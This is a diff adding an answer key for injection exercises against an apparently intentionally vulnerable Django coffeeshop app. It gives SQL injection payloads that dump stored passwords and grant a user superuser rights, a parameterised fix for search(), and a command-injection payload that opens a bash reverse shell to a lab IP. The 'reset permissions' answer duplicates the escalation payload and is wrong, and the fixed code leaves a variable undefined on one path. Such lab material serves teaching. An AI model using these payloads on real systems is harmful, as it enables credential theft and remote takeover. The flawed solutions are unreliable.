@@ -1,0 +1,54 @@
+Solutions to injection exercises
+================================
+
+Solution to Exercise "SQL Injection"
+------------------------------------
+
+Show users:
+xxx') union select id, username, password, 0.0 from auth_user --
+
+Make bob an administrator
+xxx'); update auth_user set is_staff=true, is_superuser=true where username = 'bob' --
+
+Reset bob's permissions
+xxx'); update auth_user set is_staff=true, is_superuser=true where username = 'bob' --
+
+Fixed version of search()
+
+@require_http_methods(["POST"])
+def search(request):
+    cart_size = get_cart_size(request.user)
+    error_msg = ''
+    if ('search' not in request.POST):
+        error_msg = 'Please enter a search term'
+
+    if (error_msg == ''):
+        search_text = request.POST['search']
+        with connection.cursor() as cursor:
+            sql = '''SELECT id, name, description, unit_price 
+                       FROM coffeeshop_product
+                      WHERE (LOWER(name) like %s or LOWER(description) like %s)
+                  '''
+            print(sql)
+            products = []
+            try:
+                search_term = '%' + search_text.lower().replace('%', '%%') + '%'
+                cursor.execute(sql, (search_term, search_term))
+                for row in cursor.fetchall():
+                    (pk, name, description, unit_price) = row
+                    product = Product(id=pk, name=name, description=description, 
+                        unit_price=unit_price)
+                    products.append(product)
+            except Exception as e:
+                print(e)
+    context = {"products": products, "cart_size": cart_size, "header": 'Search'}
+    return render(request, 'coffeeshop/index.html', context)
+
+-------------------------------------------------------------------------------
+
+Solution to Exercise "Command Injection"
+----------------------------------------
+
+" && bash -c 'bash -i >& /dev/tcp/10.50.0.3/9000 0>&1' #
+
+
